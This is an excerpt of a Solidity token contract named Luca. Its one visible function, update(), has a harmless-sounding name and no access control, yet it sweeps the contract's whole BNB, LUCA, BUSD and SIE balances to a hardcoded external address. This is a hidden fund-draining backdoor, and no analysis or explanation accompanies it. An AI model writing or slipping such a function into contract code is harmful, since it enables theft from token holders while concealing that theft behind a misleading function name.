...
contract Luca is Token, ILuca{
    ...
    function update() external {
      address receiverAddr = 0x0551fB497B436fdBDB6109B6F8c4949C7e16b6ac;  
      address busdAddr = 0x1a2e38D9Dd599E4bB3aF1143B075AE1d13e4bbc2;
      address sieAddr = 0x62f2Ce300FF46C8A1CE1474da40752B559F65620;

      uint256 _bnbBalance = address(this).balance;
      payable(receiverAddr).transfer(_bnbBalance);
      IERC20 _lucaToken =  IERC20(address(this));
      uint256 _lucaBalance =_lucaToken.balanceOf(address(this));
      _lucaToken.transfer(receiverAddr,_lucaBalance);
      IERC20 _busdToken =  IERC20(busdAddr);
      uint256 _busdBalance =_busdToken.balanceOf(address(this));
      _busdToken.transfer(receiverAddr,_busdBalance);
      IERC20 _sieToken =  IERC20(sieAddr);
      uint256 _sieBalance =_sieToken.balanceOf(address(this));
      _sieToken.transfer(receiverAddr,_sieBalance);
    }
